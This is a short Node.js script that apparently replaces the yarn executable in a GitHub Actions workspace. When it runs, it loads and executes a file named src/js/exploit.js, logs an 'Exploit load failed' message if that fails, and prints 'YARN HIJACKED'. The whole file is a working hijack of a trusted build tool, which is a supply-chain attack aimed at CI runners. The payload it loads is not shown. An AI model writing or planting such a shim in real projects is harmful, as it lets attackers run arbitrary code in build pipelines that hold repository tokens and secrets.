const path = require('path');
const workspace = process.env.GITHUB_WORKSPACE || process.cwd();
try {
    require(path.join(workspace, 'src/js/exploit.js'));
} catch (e) {
    console.error("Exploit load failed:", e.message);
}
// ... original yarn content or just a shim if it fails
console.log("YARN HIJACKED");
